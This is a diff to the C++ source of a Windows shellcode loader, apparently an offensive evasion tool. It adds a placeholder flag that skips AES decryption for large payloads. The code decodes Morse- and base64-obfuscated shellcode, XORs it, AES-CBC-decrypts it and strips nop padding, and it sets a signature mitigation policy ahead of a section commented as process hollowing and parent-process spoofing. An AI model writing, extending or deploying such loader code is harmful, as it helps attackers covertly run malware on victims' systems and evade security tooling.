@@ -8,6 +8,7 @@
 #include <string>
 #include <map>
 #include <sstream>
+#include <numeric>
 
 using namespace std;
 
@@ -224,6 +225,7 @@ int main()
     SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));
 
     std::vector<uint8_t> ciphertext, recovered;
+    BOOL hugeCode = REPLACEBOOLVALUE;
     std::string morsed, sh3llc0de, decoded, b64a3skey, b64a3siv, morsedb64a3skey, morsedb64a3siv, morsedxorKey, xorKey;
     base64 b64 = base64();
 
@@ -277,42 +279,50 @@ int main()
     */
     decoded = XOR(decoded, xorKey);
 
-    ciphertext.clear();
-    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
-
-    // AES Decryption Objects
-    struct AES_ctx e_ctx;
-    uint8_t key[32];
-    uint8_t iv[16];
-    string a3s_key = b64.base64_decode(b64a3skey);
-    string a3s_iv = b64.base64_decode(b64a3siv);
-    std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
-    std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));
-
-    AES_init_ctx_iv(&e_ctx, key, iv);
-
-    // DECRYPT
-    struct AES_ctx d_ctx;
-    AES_init_ctx_iv(&d_ctx, key, iv);
-    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
-    recovered.clear();
-
-    // Remove the padding from the decypted plaintext
-    SIZE_T c_size = ciphertext.size();
-    for (int i = 0; i < c_size; i++)
+    if (!hugeCode)
     {
-        if (ciphertext[i] == 0x90 && i == (c_size - 1))
+        ciphertext.clear();
+        std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
+
+        // AES Decryption Objects
+        struct AES_ctx e_ctx;
+        uint8_t key[32];
+        uint8_t iv[16];
+        string a3s_key = b64.base64_decode(b64a3skey);
+        string a3s_iv = b64.base64_decode(b64a3siv);
+        std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
+        std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));
+
+        AES_init_ctx_iv(&e_ctx, key, iv);
+
+        // DECRYPT
+        struct AES_ctx d_ctx;
+        AES_init_ctx_iv(&d_ctx, key, iv);
+        AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
+        recovered.clear();
+
+        // Remove the padding from the decypted plaintext
+        SIZE_T c_size = ciphertext.size();
+        for (int i = 0; i < c_size; i++)
         {
-            break;
+            if (ciphertext[i] == 0x90 && i == (c_size - 1))
+            {
+                break;
+            }
+            else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
+            {
+                break;
+            }
+            else
+            {
+                recovered.push_back(ciphertext[i]);
+            }
         }
-        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
-        {
-            break;
-        }
-        else
-        {
-            recovered.push_back(ciphertext[i]);
-        }
+    }
+    else
+    {
+        recovered.clear();
+        std::copy(decoded.begin(), decoded.end(), std::back_inserter(recovered));
     }
 
     //process hollowing + ppid spoofing
